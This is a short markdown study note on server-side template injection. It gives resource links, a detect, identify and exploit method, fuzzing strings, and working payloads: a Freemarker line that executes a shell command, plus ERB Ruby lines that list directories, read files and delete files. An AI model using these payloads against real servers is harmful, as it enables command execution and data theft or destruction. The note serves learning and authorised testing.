# Extra Resources
- [SSTI Playlist - Seven Seas Security](https://www.youtube.com/playlist?list=PL1GDzLoRwyVCEG_dnWcQDbDXJSBw7lTOT)
- [James Kettle Presentation](https://portswigger.net/research/server-side-template-injection)
- [Hacktricks - SSTI Payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Gadgets for payloads - SSTI PwnFunction Video](https://www.youtube.com/watch?v=SN6EVIG4c-0)
# What it is
When an attacker can inject a malicious payload through the native template language and it is executed by the server
This happens because user input is concatenated into the template instead of being passed as data
# Context
- Plaintext context
- Code context
# Reconnaissance - Where to find
# Methodology
- Look for user controlled input that is reflected
- Enumerate the template engine being used by testing with multiple payloads
- If the previous step didn't work, try to trigger an error that discloses useful information
- Exploit
## Detect
Fuzz with special characters frequently used in template expressions: 
```
${{<%[%'"}}%\
<%=foobar%>
<%= 7*7 %>
{7*7}
#{7*7}
${7*7}
{{7*7}}
${{7*7}}
[% 7*7 %]
```
Use context-specific approaches:
    - Plaintext context
    - Code context
## Identify
![SSTI Payload Tests](Screenshots/SSTIPayloadTests.png)
- Make the application generate an error. This may disclose useful information to enumerate the template engine being used
# Some Payloads
## Craft payload
Some of these payload may need to be prepended with appropriate characters so they close the template engine syntax correctly. E.g.: `}}`
Some of these payload may need to be url encoded
Use a public payload
For more specific payloads view the resources at the top (Hacktricks and James Kettle's presentation)
## Freemarker
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```
## ERB Ruby
```ruby
<%= Dir.entries('/').join(', ') %>
<%= Dir.glob('**file-name').first %>
<%= File.read('/file/path') %>
<%= File.delete('/file/path') %>
```
## Tornado
Generic
```
data}}{{payload-1}}{{payload-2}}
```
For specific payloads see Hacktricks 
